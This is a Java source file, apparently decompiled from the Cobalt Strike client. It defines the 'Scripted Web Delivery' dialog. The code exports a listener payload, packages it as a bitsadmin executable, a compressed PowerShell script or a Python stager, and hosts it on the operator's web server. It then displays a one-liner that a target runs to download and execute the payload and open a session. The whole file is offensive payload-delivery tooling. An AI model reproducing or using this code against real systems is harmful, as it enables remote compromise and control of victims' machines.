package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.ArtifactUtils;
import common.Callback;
import common.CommonUtils;
import common.ListenerUtils;
import common.PowerShellUtils;
import common.ResourceUtils;
import common.ScListener;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import java.awt.event.ActionEvent;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class ScriptedWebStageDialog implements DialogListener, Callback {
   protected JFrame dialog = null;
   protected Map options = null;
   protected AggressorClient client = null;
   protected String proto;

   public ScriptedWebStageDialog(AggressorClient var1) {
      this.client = var1;
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      this.options = var2;
      String var3 = var2.get("port") + "";
      String var4 = var2.get("uri") + "";
      String var5 = var2.get("host") + "";
      String var6 = DialogUtils.string(var2, "type");
      boolean var7 = DialogUtils.bool(var2, "ssl");
      this.proto = var7 ? "https://" : "http://";
      String var8 = var2.get("output") + "";
      String var9 = var2.get("listener") + "";
      String var10 = DialogUtils.bool(var2, "x64") ? "x64" : "x86";
      ScListener var11 = ListenerUtils.getListener(this.client, var9);
      byte[] var12 = var11.export(var10);
      if (var12.length == 0) {
         DialogUtils.showError("Could not generate " + var10 + " payload for " + var9);
      } else {
         byte[] var13;
         if ("bitsadmin".equals(var6)) {
            if ("x64".equals(var10)) {
               var13 = (new ArtifactUtils(this.client)).patchArtifact(var12, "artifact64big.exe");
            } else {
               var13 = (new ArtifactUtils(this.client)).patchArtifact(var12, "artifact32big.exe");
            }

            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(var5, Integer.parseInt(var3), var7, var4, CommonUtils.bString(var13), "application/octet-stream", "Scripted Web Delivery (bitsadmin)"), this);
         } else if ("powershell".equals(var6)) {
            var13 = (new ResourceUtils(this.client)).buildPowerShell(var12, "x64".equals(var10));
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(var5, Integer.parseInt(var3), var7, var4, (new PowerShellUtils(this.client)).PowerShellCompress(var13), "text/plain", "Scripted Web Delivery (powershell)"), this);
         } else if ("python".equals(var6)) {
            if ("x64".equals(var10)) {
               var13 = (new ResourceUtils(this.client)).buildPython(new byte[0], var12);
            } else {
               var13 = (new ResourceUtils(this.client)).buildPython(var12, new byte[0]);
            }

            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(var5, Integer.parseInt(var3), var7, var4, (new ResourceUtils(this.client)).PythonCompress(var13), "text/plain", "Scripted Web Delivery (python)"), this);
         } else {
            DialogUtils.showError("Unknown type: " + var6);
         }

      }
   }

   public void result(String var1, Object var2) {
      String var3 = var2 + "";
      String var4 = this.options.get("port") + "";
      String var5 = this.options.get("uri") + "";
      String var6 = this.options.get("host") + "";
      String var7 = this.options.get("type") + "";
      if ("success".equals(var3)) {
         DialogUtils.startedWebService("Scripted Web Delivery", CommonUtils.OneLiner(this.proto + var6 + ":" + var4 + var5, var7));
      } else {
         DialogUtils.showError("Unable to start web server:\n" + var3);
      }

   }

   public void show() {
      this.dialog = DialogUtils.dialog("Scripted Web Delivery (S)", 640, 480);
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      var1.set("uri", "/a");
      var1.set("port", "80");
      var1.set("host", DataUtils.getLocalIP(this.client.getData()));
      var1.set("type", "powershell");
      var1.text("uri", "URI Path:", 10);
      var1.text("host", "Local Host:", 20);
      var1.text("port", "Local Port:", 20);
      var1.sc_listener_all("listener", "Listener:", this.client);
      var1.combobox("type", "Type:", CommonUtils.toArray("bitsadmin, powershell, python"));
      var1.checkbox_add("x64", "x64:", "Use x64 payload");
      var1.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.client.getData()));
      JButton var2 = var1.action("Launch");
      JButton var3 = var1.help("https://www.cobaltstrike.com/help-scripted-web-delivery");
      this.dialog.add(DialogUtils.description("This attack hosts an artifact that delivers a full Cobalt Strike payload. The provided one-liner will allow you to quickly get a session on a target host."), "North");
      this.dialog.add(var1.layout(), "Center");
      this.dialog.add(DialogUtils.center(var2, var3), "South");
      this.dialog.pack();
      this.dialog.setVisible(true);
   }
}
